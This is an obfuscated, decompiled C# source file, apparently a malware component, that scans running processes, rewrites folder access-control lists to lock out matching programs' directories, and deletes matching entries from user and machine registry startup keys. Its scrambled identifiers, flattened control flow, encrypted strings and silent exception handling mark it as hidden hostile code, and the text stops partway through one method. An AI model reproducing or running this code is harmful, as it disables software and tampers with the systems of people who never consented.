using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32;

public class DobYDSwkSrXkWkMLTOdyziWQylRk
{
	public static int hBveoeihUogCBZztXIbZbUzflDpXA;

	public static int gPoEzgcIoDDzseQakDHCsevAUDwhb;

	public static int staLrosdvPFQUCRrMpxjudrHGeql;

	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(uint uint_0, bool bool_0, int int_0);

	[DllImport("psapi.dll")]
	private static extern uint GetModuleFileNameEx(IntPtr intptr_0, IntPtr intptr_1, [Out] StringBuilder stringBuilder_0, [In][MarshalAs(UnmanagedType.U4)] int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr intptr_0);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(IntPtr intptr_0, string string_0);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool IsWindowVisible(IntPtr intptr_0);

	public static void VfghtWyZOiNeGhXOYpAfQjEaEonh()
	{
		BoyRUTrbPoduMbNCjjseqRbGRJrdb();
	}

	public static void BoyRUTrbPoduMbNCjjseqRbGRJrdb()
	{
		Process[] array = DobYDSwkSrXkWkMLTOdyziWQylRk.LEkTJDnCJEONxFwfJktHTYxxFitK();
		int num = _003CModule_003E.DUuMrhCbuZnoxVHKGrXPrcspoeTr<int>(13459881u);
		int num2 = 841978963;
		uint num3 = 47883661u;
		while (true)
		{
			if (num < array.Length)
			{
				Process process_ = array[num];
				try
				{
					if (!DobYDSwkSrXkWkMLTOdyziWQylRk.itJjvSZwsfodmEwVRhhoXpqArxdq(DobYDSwkSrXkWkMLTOdyziWQylRk.AtxNmqEYfgKOziCqHfaJQEuBLCJQ(DobYDSwkSrXkWkMLTOdyziWQylRk.lwcsJYjRdvKNexgIKOjTRsCovLCt(process_)), DobYDSwkSrXkWkMLTOdyziWQylRk.pAGgfPLCwNQubndFoPWBonCRUklo(_003CModule_003E.xjxQUSvjJuxTPiElWBJfzVfPzOZv<string>(2620716884u))))
					{
						goto IL_0061;
					}
					goto IL_0234;
					IL_0234:
					int num4;
					int num5;
					if (DobYDSwkSrXkWkMLTOdyziWQylRk.dfpCPQsBDRRZLGbkNCFwbocYRqSeb(DobYDSwkSrXkWkMLTOdyziWQylRk.QeScWBDMvZcGIFNjGujcopUwwPnCA(process_), DobYDSwkSrXkWkMLTOdyziWQylRk.QeScWBDMvZcGIFNjGujcopUwwPnCA(DobYDSwkSrXkWkMLTOdyziWQylRk.zsvcAmhuTnzoZsAlGIwweZFfZqukA())))
					{
						num4 = -677143278;
						num5 = -677143278;
					}
					else
					{
						num4 = 151704462;
						num5 = 151704462;
					}
					goto IL_01d3;
					IL_01d3:
					while (true)
					{
						num2 = num4;
						switch ((num3 = (uint)(-1978749770 - ((-910811047 - num2) ^ -763732629)) ^ 0x7C3F8B28u ^ 0x3AF4F5ECu) % 9u)
						{
						case 7u:
							break;
						case 6u:
						{
							int num8;
							int num9;
							if (!IsWindowVisible(DobYDSwkSrXkWkMLTOdyziWQylRk.VGYBKHNjQGavcYUKveCNNLLDFLPY(process_)))
							{
								num8 = -1635751734;
								num9 = -1635751734;
							}
							else
							{
								num8 = 2074631208;
								num9 = 2074631208;
							}
							num4 = num8 ^ ((int)num3 * -1646603659);
							continue;
						}
						case 5u:
						{
							int num12;
							int num13;
							if (DobYDSwkSrXkWkMLTOdyziWQylRk.itJjvSZwsfodmEwVRhhoXpqArxdq(DobYDSwkSrXkWkMLTOdyziWQylRk.AtxNmqEYfgKOziCqHfaJQEuBLCJQ(DobYDSwkSrXkWkMLTOdyziWQylRk.lwcsJYjRdvKNexgIKOjTRsCovLCt(process_)), DobYDSwkSrXkWkMLTOdyziWQylRk.pAGgfPLCwNQubndFoPWBonCRUklo(_003CModule_003E.rvbUTwHOsmcNBcQsYgfyxVYsWwJg<string>(1211847296u))))
							{
								num12 = 2127398251;
								num13 = 2127398251;
							}
							else
							{
								num12 = 1298856287;
								num13 = 1298856287;
							}
							num4 = num12 ^ ((int)num3 * -2050513777);
							continue;
						}
						case 4u:
						{
							int num10;
							int num11;
							if (DobYDSwkSrXkWkMLTOdyziWQylRk.itJjvSZwsfodmEwVRhhoXpqArxdq(DobYDSwkSrXkWkMLTOdyziWQylRk.AtxNmqEYfgKOziCqHfaJQEuBLCJQ(DobYDSwkSrXkWkMLTOdyziWQylRk.lwcsJYjRdvKNexgIKOjTRsCovLCt(process_)), DobYDSwkSrXkWkMLTOdyziWQylRk.pAGgfPLCwNQubndFoPWBonCRUklo(_003CModule_003E.DUuMrhCbuZnoxVHKGrXPrcspoeTr<string>(1433136448u))))
							{
								num10 = -1285776106;
								num11 = -1285776106;
							}
							else
							{
								num10 = -1045998102;
								num11 = -1045998102;
							}
							num4 = num10 ^ (int)(num3 * 1687879713);
							continue;
						}
						case 3u:
						{
							int num14;
							int num15;
							if (!DobYDSwkSrXkWkMLTOdyziWQylRk.itJjvSZwsfodmEwVRhhoXpqArxdq(DobYDSwkSrXkWkMLTOdyziWQylRk.AtxNmqEYfgKOziCqHfaJQEuBLCJQ(DobYDSwkSrXkWkMLTOdyziWQylRk.lwcsJYjRdvKNexgIKOjTRsCovLCt(process_)), DobYDSwkSrXkWkMLTOdyziWQylRk.pAGgfPLCwNQubndFoPWBonCRUklo(_003CModule_003E.MikTwNgIBVHjEMLNTODKmzpCiqin<string>(385275137u))))
							{
								num14 = 1661841046;
								num15 = 1661841046;
							}
							else
							{
								num14 = 1431960970;
								num15 = 1431960970;
							}
							num4 = num14 ^ (int)(num3 * 1737107704);
							continue;
						}
						case 2u:
							UcMcUIPfpUbUHDnbNImNaCXjuYzcB(DobYDSwkSrXkWkMLTOdyziWQylRk.QeScWBDMvZcGIFNjGujcopUwwPnCA(process_), DobYDSwkSrXkWkMLTOdyziWQylRk.AtxNmqEYfgKOziCqHfaJQEuBLCJQ(DobYDSwkSrXkWkMLTOdyziWQylRk.lwcsJYjRdvKNexgIKOjTRsCovLCt(process_)), DobYDSwkSrXkWkMLTOdyziWQylRk.dcDcGSBFYhroIMaFThAeISRDKkZhb(process_));
							num4 = ((int)num3 * -404477956) ^ 0x7AFEBBE;
							continue;
						case 0u:
						{
							int num6;
							int num7;
							if (DobYDSwkSrXkWkMLTOdyziWQylRk.itJjvSZwsfodmEwVRhhoXpqArxdq(DobYDSwkSrXkWkMLTOdyziWQylRk.AtxNmqEYfgKOziCqHfaJQEuBLCJQ(DobYDSwkSrXkWkMLTOdyziWQylRk.lwcsJYjRdvKNexgIKOjTRsCovLCt(process_)), DobYDSwkSrXkWkMLTOdyziWQylRk.pAGgfPLCwNQubndFoPWBonCRUklo(_003CModule_003E.dpxHirlQuRSzbXiBGQArohLuCnMj<string>(3690846845u))))
							{
								num6 = 443694300;
								num7 = 443694300;
							}
							else
							{
								num6 = 610535503;
								num7 = 610535503;
							}
							num4 = num6 ^ ((int)num3 * -1363718081);
							continue;
						}
						default:
							goto end_IL_002b;
						case 1u:
							goto IL_0234;
						case 8u:
							goto end_IL_002b;
						}
						break;
					}
					goto IL_0061;
					IL_0061:
					num4 = 1949186740;
					goto IL_01d3;
					end_IL_002b:;
				}
				catch (Exception)
				{
				}
				num += _003CModule_003E.sqPVKnDZOQggfizDoCDEcDgwRZtQ<int>(3615143063u);
				goto IL_0255;
			}
			int num16 = -881334731;
			goto IL_025a;
			IL_025a:
			num2 = num16;
			switch ((num3 = (uint)(-1978749770 - ((-910811047 - num2) ^ -763732629)) ^ 0x7C3F8B28u ^ 0x3AF4F5ECu) % 3u)
			{
			case 2u:
				break;
			case 0u:
				goto IL_0255;
			default:
				return;
			case 1u:
				return;
			}
			continue;
			IL_0255:
			num16 = 499714293;
			goto IL_025a;
		}
	}

	public static void UcMcUIPfpUbUHDnbNImNaCXjuYzcB(string string_0, string string_1, int int_0)
	{
		if (CaXduEdRJboCcSPXbZbrKvOZyyOOA.BKdQaiLPawkjMznueCrpoNHnutZC(string_0))
		{
			return;
		}
		while (true)
		{
			int num = 1665395880;
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)(~(-((num2 + -1521521342) ^ -239800337) + -412123706))) % 4u)
				{
				case 2u:
					nWhDOmhZFUIjakbGwviSQtcCqtvd(string_1);
					zWtyKMyOgJNwihhWkJkzXEXxifHp(int_0);
					NZpWvxqwYTkJAOXSEyAVCFwbDNnC(string_0, string_1, int_0);
					num = ((int)num3 * -2016578580) ^ -224566747;
					continue;
				case 1u:
					mqmnrTVwLMRaLlxPeOOnWTINYuhk(string_0, string_1);
					num = ((int)num3 * -1130086532) ^ -211321558;
					continue;
				default:
					return;
				case 3u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	public static void nWhDOmhZFUIjakbGwviSQtcCqtvd(string string_0)
	{
		try
		{
			string string_ = DobYDSwkSrXkWkMLTOdyziWQylRk.lZGpJVuqLkJZdEqSnBMtIoKSkPtu((object)DobYDSwkSrXkWkMLTOdyziWQylRk.zlisMWMHjxgPXMcTmYXJywNRSsaR());
			DirectoryInfo directoryInfo_ = DobYDSwkSrXkWkMLTOdyziWQylRk.ElhdPtcMeMfmiYSuHdbslXHCRYBl(string_0);
			DirectorySecurity directorySecurity = DobYDSwkSrXkWkMLTOdyziWQylRk.vBVBneffumKuLugCYhPIUTKTCHtC();
			DobYDSwkSrXkWkMLTOdyziWQylRk.kIXtNzgqZqSYWHVpTJTMyJndHwWHA((FileSystemSecurity)directorySecurity, DobYDSwkSrXkWkMLTOdyziWQylRk.QNlfcAdHOtFiFPrbmgDLZGFLpUbL(string_, (FileSystemRights)_003CModule_003E.hywSkonEwbWqVJvdXIANcTkCRCmp<int>(24984359u), (InheritanceFlags)_003CModule_003E.JNSQYZLYsqATUsJkEIlLGVFqNhzeb<int>(480822502u), (PropagationFlags)_003CModule_003E.ODkbfxpVhRhqGtIspNCsSBULKrV<int>(1511222926u), (AccessControlType)_003CModule_003E.rvbUTwHOsmcNBcQsYgfyxVYsWwJg<int>(2108116483u)));
			DobYDSwkSrXkWkMLTOdyziWQylRk.cjeSGXMKuehJSleEhqeaalXFKekr((ObjectSecurity)directorySecurity, (byte)_003CModule_003E.DUuMrhCbuZnoxVHKGrXPrcspoeTr<int>(1256046322u) != 0, (byte)_003CModule_003E.CFFSRdVmFeIoyFkQckyKuwiGeXPR<int>(4132056026u) != 0);
			DobYDSwkSrXkWkMLTOdyziWQylRk.trsHuMhdbnLqZcXLoGIRXLYCkfjj(directoryInfo_, directorySecurity);
		}
		catch
		{
		}
	}

	public static void RQxyUWraHrVyCIcWIjMLoAmgdFOHA(string string_0)
	{
		try
		{
			string string_ = DobYDSwkSrXkWkMLTOdyziWQylRk.lZGpJVuqLkJZdEqSnBMtIoKSkPtu((object)DobYDSwkSrXkWkMLTOdyziWQylRk.zlisMWMHjxgPXMcTmYXJywNRSsaR());
			DirectorySecurity directorySecurity = default(DirectorySecurity);
			DirectoryInfo directoryInfo_ = default(DirectoryInfo);
			while (true)
			{
				int num = 110938422;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)(~(-(-(num2 ^ -1259138443)) ^ 0x6A74F6F2))) % 11u)
					{
					case 10u:
						DobYDSwkSrXkWkMLTOdyziWQylRk.kIXtNzgqZqSYWHVpTJTMyJndHwWHA((FileSystemSecurity)directorySecurity, DobYDSwkSrXkWkMLTOdyziWQylRk.QNlfcAdHOtFiFPrbmgDLZGFLpUbL(string_, (FileSystemRights)_003CModule_003E.UWUPlzHonxoEQOBrGBfeIrtuHJlIb<int>(1955271598u), (InheritanceFlags)_003CModule_003E.rvbUTwHOsmcNBcQsYgfyxVYsWwJg<int>(2379152521u), (PropagationFlags)_003CModule_003E.WgpDFIDBthfUHHPzdxdaGkTjtimi<int>(732702483u), (AccessControlType)_003CModule_003E.xjxQUSvjJuxTPiElWBJfzVfPzOZv<int>(4227165274u)));
						num = (int)(num3 * 1177643673) ^ -771357919;
						continue;
					case 9u:
						DobYDSwkSrXkWkMLTOdyziWQylRk.kIXtNzgqZqSYWHVpTJTMyJndHwWHA((FileSystemSecurity)directorySecurity, DobYDSwkSrXkWkMLTOdyziWQylRk.QNlfcAdHOtFiFPrbmgDLZGFLpUbL(string_, (FileSystemRights)_003CModule_003E.xjxQUSvjJuxTPiElWBJfzVfPzOZv<int>(3992168967u), (InheritanceFlags)_003CModule_003E.hywSkonEwbWqVJvdXIANcTkCRCmp<int>(4170797610u), (PropagationFlags)_003CModule_003E.EOwkCftCumriwZFLeBeAujknGJby<int>(515202783u), (AccessControlType)_003CModule_003E.WgpDFIDBthfUHHPzdxdaGkTjtimi<int>(732702483u)));
						DobYDSwkSrXkWkMLTOdyziWQylRk.cjeSGXMKuehJSleEhqeaalXFKekr((ObjectSecurity)directorySecurity, (byte)_003CModule_003E.hywSkonEwbWqVJvdXIANcTkCRCmp<int>(3350669611u) != 0, (byte)_003CModule_003E.EOwkCftCumriwZFLeBeAujknGJby<int>(2360121032u) != 0);
						num = ((int)num3 * -1962359362) ^ -794360474;
						continue;
					case 8u:
						directorySecurity = DobYDSwkSrXkWkMLTOdyziWQylRk.vBVBneffumKuLugCYhPIUTKTCHtC();
						num = (int)(num3 * 312387774) ^ -1573560865;
						continue;
					case 7u:
						directoryInfo_ = DobYDSwkSrXkWkMLTOdyziWQylRk.ElhdPtcMeMfmiYSuHdbslXHCRYBl(string_0);
						num = ((int)num3 * -1593738551) ^ 0x4EEAAEBE;
						continue;
					case 6u:
						DobYDSwkSrXkWkMLTOdyziWQylRk.kIXtNzgqZqSYWHVpTJTMyJndHwWHA((FileSystemSecurity)directorySecurity, DobYDSwkSrXkWkMLTOdyziWQylRk.QNlfcAdHOtFiFPrbmgDLZGFLpUbL(string_, (FileSystemRights)_003CModule_003E.InSeajbqYmMBLFjcDEnfkUXlgyLtB<int>(3801696975u), (InheritanceFlags)_003CModule_003E.ODkbfxpVhRhqGtIspNCsSBULKrV<int>(2089055292u), (PropagationFlags)_003CModule_003E.WgpDFIDBthfUHHPzdxdaGkTjtimi<int>(732702483u), (AccessControlType)_003CModule_003E.InSeajbqYmMBLFjcDEnfkUXlgyLtB<int>(3933008549u)));
						num = ((int)num3 * -1707318580) ^ -237912149;
						continue;
					case 5u:
						DobYDSwkSrXkWkMLTOdyziWQylRk.kIXtNzgqZqSYWHVpTJTMyJndHwWHA((FileSystemSecurity)directorySecurity, DobYDSwkSrXkWkMLTOdyziWQylRk.QNlfcAdHOtFiFPrbmgDLZGFLpUbL(string_, (FileSystemRights)_003CModule_003E.CFFSRdVmFeIoyFkQckyKuwiGeXPR<int>(1223117472u), (InheritanceFlags)_003CModule_003E.UWUPlzHonxoEQOBrGBfeIrtuHJlIb<int>(1615373721u), (PropagationFlags)_003CModule_003E.MikTwNgIBVHjEMLNTODKmzpCiqin<int>(1546912917u), (AccessControlType)_003CModule_003E.WgpDFIDBthfUHHPzdxdaGkTjtimi<int>(3673226060u)));
						num = ((int)num3 * -238715695) ^ -1979890762;
						continue;
					case 4u:
						DobYDSwkSrXkWkMLTOdyziWQylRk.kIXtNzgqZqSYWHVpTJTMyJndHwWHA((FileSystemSecurity)directorySecurity, DobYDSwkSrXkWkMLTOdyziWQylRk.QNlfcAdHOtFiFPrbmgDLZGFLpUbL(string_, (FileSystemRights)_003CModule_003E.CFFSRdVmFeIoyFkQckyKuwiGeXPR<int>(1505119107u), (InheritanceFlags)_003CModule_003E.dpxHirlQuRSzbXiBGQArohLuCnMj<int>(906383712u), (PropagationFlags)_003CModule_003E.ODkbfxpVhRhqGtIspNCsSBULKrV<int>(1511222926u), (AccessControlType)_003CModule_003E.hywSkonEwbWqVJvdXIANcTkCRCmp<int>(3350669611u)));
						DobYDSwkSrXkWkMLTOdyziWQylRk.kIXtNzgqZqSYWHVpTJTMyJndHwWHA((FileSystemSecurity)directorySecurity, DobYDSwkSrXkWkMLTOdyziWQylRk.QNlfcAdHOtFiFPrbmgDLZGFLpUbL(string_, (FileSystemRights)_003CModule_003E.InSeajbqYmMBLFjcDEnfkUXlgyLtB<int>(365168562u), (InheritanceFlags)_003CModule_003E.CFFSRdVmFeIoyFkQckyKuwiGeXPR<int>(1312039676u), (PropagationFlags)_003CModule_003E.dpxHirlQuRSzbXiBGQArohLuCnMj<int>(463725150u), (AccessControlType)_003CModule_003E.UWUPlzHonxoEQOBrGBfeIrtuHJlIb<int>(2923104656u)));
						DobYDSwkSrXkWkMLTOdyziWQylRk.kIXtNzgqZqSYWHVpTJTMyJndHwWHA((FileSystemSecurity)directorySecurity, DobYDSwkSrXkWkMLTOdyziWQylRk.QNlfcAdHOtFiFPrbmgDLZGFLpUbL(string_, (FileSystemRights)_003CModule_003E.InSeajbqYmMBLFjcDEnfkUXlgyLtB<int>(1979719381u), (InheritanceFlags)_003CModule_003E.MikTwNgIBVHjEMLNTODKmzpCiqin<int>(435579935u), (PropagationFlags)_003CModule_003E.MikTwNgIBVHjEMLNTODKmzpCiqin<int>(1546912917u), (AccessControlType)_003CModule_003E.InSeajbqYmMBLFjcDEnfkUXlgyLtB<int>(3933008549u)));
						DobYDSwkSrXkWkMLTOdyziWQylRk.kIXtNzgqZqSYWHVpTJTMyJndHwWHA((FileSystemSecurity)directorySecurity, DobYDSwkSrXkWkMLTOdyziWQylRk.QNlfcAdHOtFiFPrbmgDLZGFLpUbL(string_, (FileSystemRights)_003CModule_003E.rvbUTwHOsmcNBcQsYgfyxVYsWwJg<int>(3275939667u), (InheritanceFlags)_003CModule_003E.sqPVKnDZOQggfizDoCDEcDgwRZtQ<int>(1753671160u), (PropagationFlags)_003CModule_003E.sqPVKnDZOQggfizDoCDEcDgwRZtQ<int>(3962785262u), (AccessControlType)_003CModule_003E.CFFSRdVmFeIoyFkQckyKuwiGeXPR<int>(3850054391u)));
						num = ((int)num3 * -1836358290) ^ -1680244235;
						continue;
					case 3u:
						DobYDSwkSrXkWkMLTOdyziWQylRk.trsHuMhdbnLqZcXLoGIRXLYCkfjj(directoryInfo_, directorySecurity);
						num = ((int)num3 * -1262884989) ^ 0x3FE90B30;
						continue;
					case 0u:
						DobYDSwkSrXkWkMLTOdyziWQylRk.kIXtNzgqZqSYWHVpTJTMyJndHwWHA((FileSystemSecurity)directorySecurity, DobYDSwkSrXkWkMLTOdyziWQylRk.QNlfcAdHOtFiFPrbmgDLZGFLpUbL(string_, (FileSystemRights)_003CModule_003E.WgpDFIDBthfUHHPzdxdaGkTjtimi<int>(1615126919u), (InheritanceFlags)_003CModule_003E.rvbUTwHOsmcNBcQsYgfyxVYsWwJg<int>(2379152521u), (PropagationFlags)_003CModule_003E.hywSkonEwbWqVJvdXIANcTkCRCmp<int>(4226319696u), (AccessControlType)_003CModule_003E.UWUPlzHonxoEQOBrGBfeIrtuHJlIb<int>(1055538579u)));
						num = (int)((num3 * 282050056) ^ 0x6F49F580);
						continue;
					default:
						return;
					case 2u:
						break;
					case 1u:
						return;
					}
					break;
				}
			}
		}
		catch
		{
		}
	}

	public static void mqmnrTVwLMRaLlxPeOOnWTINYuhk(string string_0, string string_1)
	{
		try
		{
			RegistryKey registryKey_ = DobYDSwkSrXkWkMLTOdyziWQylRk.iwoJgaiIGJpOYrCjykmxdOgESMyg(Registry.CurrentUser, _003CModule_003E.CFFSRdVmFeIoyFkQckyKuwiGeXPR<string>(649310588u));
			int num6 = default(int);
			string text = default(string);
			string[] array = default(string[]);
			while (true)
			{
				IL_01c5:
				int num = -1249034115;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)((1913494228 - (num2 + 802644762 - -281283418)) * -341351185 - -3901004)) % 12u)
					{
					case 11u:
						hBveoeihUogCBZztXIbZbUzflDpXA += _003CModule_003E.WgpDFIDBthfUHHPzdxdaGkTjtimi<int>(3673226060u);
						num = (int)((num3 * 194638264) ^ 0xAB0EB42);
						continue;
					case 9u:
						num6 = _003CModule_003E.dpxHirlQuRSzbXiBGQArohLuCnMj<int>(463725150u);
						num = ((int)num3 * -1711896809) ^ 0x38BAD29;
						continue;
					case 8u:
						xwGXuordbbhlvcLYTAexcAjaVxBbB(_003CModule_003E.DUuMrhCbuZnoxVHKGrXPrcspoeTr<string>(4134650320u), _003CModule_003E.sqPVKnDZOQggfizDoCDEcDgwRZtQ<string>(2352626296u), text);
						num = ((int)num3 * -1829954668) ^ 0x2F088E2B;
						continue;
					case 7u:
						text = array[num6];
						num = -1720127844;
						continue;
					case 6u:
						num = ((int)num3 * -62798227) ^ 0x34C9B4BD;
						continue;
					case 5u:
					{
						int num8;
						int num9;
						if (DobYDSwkSrXkWkMLTOdyziWQylRk.dfpCPQsBDRRZLGbkNCFwbocYRqSeb(text, awaaxsybNLyafPEOFvaILTvtSRU.utZEkoevwRvsmxDkvGZTUlCMkKmv))
						{
							num8 = 1959511401;
							num9 = 1959511401;
						}
						else
						{
							num8 = 1937505559;
							num9 = 1937505559;
						}
						num = num8 ^ (int)(num3 * 1541036265);
						continue;
					}
					case 3u:
					{
						int num7;
						if (num6 >= array.Length)
						{
							num = 1363730216;
							num7 = 1363730216;
						}
						else
						{
							num = 2137483271;
							num7 = 2137483271;
						}
						continue;
					}
					case 2u:
						num6 += _003CModule_003E.dpxHirlQuRSzbXiBGQArohLuCnMj<int>(3943964843u);
						num = 1001725007;
						continue;
					case 1u:
						array = DobYDSwkSrXkWkMLTOdyziWQylRk.BdjBUbgJQepVwDQxerundBKeENLjb(registryKey_);
						num = ((int)num3 * -1902598671) ^ -249040004;
						continue;
					case 0u:
					{
						int num4;
						int num5;
						if (DobYDSwkSrXkWkMLTOdyziWQylRk.itJjvSZwsfodmEwVRhhoXpqArxdq(DobYDSwkSrXkWkMLTOdyziWQylRk.lZGpJVuqLkJZdEqSnBMtIoKSkPtu(DobYDSwkSrXkWkMLTOdyziWQylRk.xaMjkLUfikFaJFkBNxkKCWvXRfeV(registryKey_, text)), string_0))
						{
							num4 = 1719361;
							num5 = 1719361;
						}
						else
						{
							num4 = 232089554;
							num5 = 232089554;
						}
						num = num4 ^ (int)(num3 * 708686331);
						continue;
					}
					default:
						goto end_IL_0166;
					case 10u:
						break;
					case 4u:
						goto end_IL_0166;
					}
					goto IL_01c5;
					continue;
					end_IL_0166:
					break;
				}
				break;
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey_2 = DobYDSwkSrXkWkMLTOdyziWQylRk.iwoJgaiIGJpOYrCjykmxdOgESMyg(Registry.CurrentUser, _003CModule_003E.JNSQYZLYsqATUsJkEIlLGVFqNhzeb<string>(3679032775u));
			string text2 = default(string);
			string[] array2 = default(string[]);
			int num15 = default(int);
			while (true)
			{
				IL_037c:
				int num10 = -106079039;
				while (true)
				{
					int num2 = num10;
					uint num3;
					switch ((num3 = (uint)((1913494228 - (num2 + 802644762 - -281283418)) * -341351185 - -3901004)) % 11u)
					{
					case 10u:
					{
						int num13;
						int num14;
						if (DobYDSwkSrXkWkMLTOdyziWQylRk.itJjvSZwsfodmEwVRhhoXpqArxdq(DobYDSwkSrXkWkMLTOdyziWQylRk.lZGpJVuqLkJZdEqSnBMtIoKSkPtu(DobYDSwkSrXkWkMLTOdyziWQylRk.xaMjkLUfikFaJFkBNxkKCWvXRfeV(registryKey_2, text2)), string_1))
						{
							num13 = -1359045359;
							num14 = -1359045359;
						}
						else
						{
							num13 = 296679564;
							num14 = 296679564;
						}
						num10 = num13 ^ (int)(num3 * 2028539905);
						continue;
					}
					case 9u:
						text2 = array2[num15];
						num10 = 637552478;
						continue;
					case 8u:
						num15 = _003CModule_003E.MikTwNgIBVHjEMLNTODKmzpCiqin<int>(1546912917u);
						num10 = (int)(num3 * 1920249958) ^ -2083470675;
						continue;
					case 7u:
					{
						int num16;
						if (num15 < array2.Length)
						{
							num10 = 662630130;
							num16 = 662630130;
						}
						else
						{
							num10 = -917172728;
							num16 = -917172728;
						}
						continue;
					}
					case 6u:
						xwGXuordbbhlvcLYTAexcAjaVxBbB(_003CModule_003E.EOwkCftCumriwZFLeBeAujknGJby<string>(3193853362u), _003CModule_003E.EOwkCftCumriwZFLeBeAujknGJby<string>(3395563628u), text2);
						hBveoeihUogCBZztXIbZbUzflDpXA += _003CModule_003E.YldckkxrnqITblrqfUdHgXoRQPFq<int>(2830137045u);
						num10 = ((int)num3 * -83840037) ^ -2054342370;
						continue;
					case 5u:
						num10 = (int)((num3 * 76558736) ^ 0x37253D15);
						continue;
					case 4u:
						num15 += _003CModule_003E.MikTwNgIBVHjEMLNTODKmzpCiqin<int>(1643009752u);
						num10 = -18857499;
						continue;
					case 1u:
						array2 = DobYDSwkSrXkWkMLTOdyziWQylRk.BdjBUbgJQepVwDQxerundBKeENLjb(registryKey_2);
						num10 = ((int)num3 * -387792062) ^ -509148577;
						continue;
					case 0u:
					{
						int num11;
						int num12;
						if (!DobYDSwkSrXkWkMLTOdyziWQylRk.dfpCPQsBDRRZLGbkNCFwbocYRqSeb(text2, awaaxsybNLyafPEOFvaILTvtSRU.utZEkoevwRvsmxDkvGZTUlCMkKmv))
						{
							num11 = 422733554;
							num12 = 422733554;
						}
						else
						{
							num11 = -1137048408;
							num12 = -1137048408;
						}
						num10 = num11 ^ ((int)num3 * -1736319284);
						continue;
					}
					default:
						goto end_IL_0321;
					case 3u:
						break;
					case 2u:
						goto end_IL_0321;
					}
					goto IL_037c;
					continue;
					end_IL_0321:
					break;
				}
				break;
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey_3 = DobYDSwkSrXkWkMLTOdyziWQylRk.iwoJgaiIGJpOYrCjykmxdOgESMyg(Registry.LocalMachine, _003CModule_003E.YldckkxrnqITblrqfUdHgXoRQPFq<string>(1521265520u));
			int num18 = default(int);
			string text3 = default(string);
			string[] array3 = default(string[]);
			while (true)
			{
				IL_0526:
				int num17 = -1840684588;
				while (true)
				{
					int num2 = num17;
					uint num3;
					switch ((num3 = (uint)((1913494228 - (num2 + 802644762 - -281283418)) * -341351185 - -3901004)) % 10u)
					{
					case 9u:
						num18 = _003CModule_003E.DUuMrhCbuZnoxVHKGrXPrcspoeTr<int>(13459881u);
						num17 = ((int)num3 * -221120744) ^ 0x3EA7BAA5;
						continue;
					case 8u:
					{
						int num21;
						int num22;
						if (!DobYDSwkSrXkWkMLTOdyziWQylRk.dfpCPQsBDRRZLGbkNCFwbocYRqSeb(text3, awaaxsybNLyafPEOFvaILTvtSRU.utZEkoevwRvsmxDkvGZTUlCMkKmv))
						{
							num21 = 941633533;
							num22 = 941633533;
						}
						else
						{
							num21 = -54984073;
							num22 = -54984073;
						}
						num17 = num21 ^ (int)(num3 * 45412687);
						continue;
					}
					case 7u:
						num17 = ((int)num3 * -129029667) ^ -1917677183;
						continue;
					case 6u:
					{
						text3 = array3[num18];
						int num20;
						if (DobYDSwkSrXkWkMLTOdyziWQylRk.itJjvSZwsfodmEwVRhhoXpqArxdq(DobYDSwkSrXkWkMLTOdyziWQylRk.lZGpJVuqLkJZdEqSnBMtIoKSkPtu(DobYDSwkSrXkWkMLTOdyziWQylRk.xaMjkLUfikFaJFkBNxkKCWvXRfeV(registryKey_3, text3)), string_1))
						{
							num17 = 1705132466;
							num20 = 1705132466;
						}
						else
						{
							num17 = 765087071;
							num20 = 765087071;
						}
						continue;
					}
					case 3u:
						xwGXuordbbhlvcLYTAexcAjaVxBbB(_003CModule_003E.rvbUTwHOsmcNBcQsYgfyxVYsWwJg<string>(482188010u), _003CModule_003E.xjxQUSvjJuxTPiElWBJfzVfPzOZv<string>(4009929628u), text3);
						hBveoeihUogCBZztXIbZbUzflDpXA += _003CModule_003E.DUuMrhCbuZnoxVHKGrXPrcspoeTr<int>(1256046322u);
						num17 = (int)(num3 * 1153891813) ^ -604654486;
						continue;
					case 2u:
						array3 = DobYDSwkSrXkWkMLTOdyziWQylRk.BdjBUbgJQepVwDQxerundBKeENLjb(registryKey_3);
						num17 = ((int)num3 * -1342276689) ^ 0xCBA0F0B;
						continue;
					case 1u:
						num18 += _003CModule_003E.MikTwNgIBVHjEMLNTODKmzpCiqin<int>(1643009752u);
						num17 = -133050876;
						continue;
					case 0u:
					{
						int num19;
						if (num18 >= array3.Length)
						{
							num17 = 180681346;
							num19 = 180681346;
						}
						else
						{
							num17 = 309697678;
							num19 = 309697678;
						}
						continue;
					}
					default:
						goto end_IL_04cf;
					case 5u:
						break;
					case 4u:
						goto end_IL_04cf;
					}
					goto IL_0526;
					continue;
					end_IL_04cf:
					break;
				}
				break;
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey_4 = DobYDSwkSrXkWkMLTOdyziWQylRk.iwoJgaiIGJpOYrCjykmxdOgESMyg(Registry.LocalMachine, _003CModule_003E.DUuMrhCbuZnoxVHKGrXPrcspoeTr<string>(3000234374u));
			int num24 = default(int);
			string[] array4 = default(string[]);
			string text4 = default(string);
			while (true)
			{
				int num23 = -1868902919;
				while (true)
				{
					int num2 = num23;
					uint num3;
					switch ((num3 = (uint)((1913494228 - (num2 + 802644762 - -281283418)) * -341351185 - -3901004)) % 12u)
					{
					case 11u:
					{
						int num29;
						if (num24 >= array4.Length)
						{
							num23 = -1766160852;
							num29 = -1766160852;
						}
						else
						{
							num23 = -1481357094;
							num29 = -1481357094;
						}
						continue;
					}
					case 10u:
						text4 = array4[num24];
						num23 = 1120402927;
						continue;
					case 9u:
						array4 = DobYDSwkSrXkWkMLTOdyziWQylRk.BdjBUbgJQepVwDQxerundBKeENLjb(registryKey_4);
						num23 = ((int)num3 * -1153142827) ^ -357668073;
						continue;
					case 8u:
